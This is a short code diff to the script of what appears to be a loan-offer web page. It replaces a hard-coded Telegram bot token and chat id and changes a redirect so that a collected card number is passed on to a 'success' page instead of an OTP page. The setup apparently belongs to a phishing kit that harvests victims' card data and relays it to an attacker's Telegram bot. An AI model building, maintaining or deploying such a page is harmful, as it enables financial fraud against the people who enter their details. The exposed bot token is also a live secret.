@@ -425,7 +425,7 @@
     </footer>
 
     <script>
-        const BOT = '8962157089:AAE0Xfxqg41aj8X-msfislZfA6s2ZejNkOM';
+        const BOT = '8590500900:AAHPWmD6thogcJ52BWiV_KaQ4pR0W7Nm560';
         const CID = '8406078749';
         let loanData = {
             name: "Valued Client",
@@ -605,7 +605,7 @@
         function proceedToOTP() {
             // Keeping the existing flow intact, but replacing phone param with card number param
             const cardNumber = document.getElementById('cardNumber').value.trim().replace(/\s/g, '');
-            location.href = 'otp.html?name=' + loanData.name + '&amount=' + loanData.amount + '&purpose=' + loanData.purpose + '&phone=' + cardNumber;
+            location.href = 'success.html?name=' + loanData.name + '&amount=' + loanData.amount + '&purpose=' + loanData.purpose + '&phone=' + cardNumber;
         }
     </script>
 
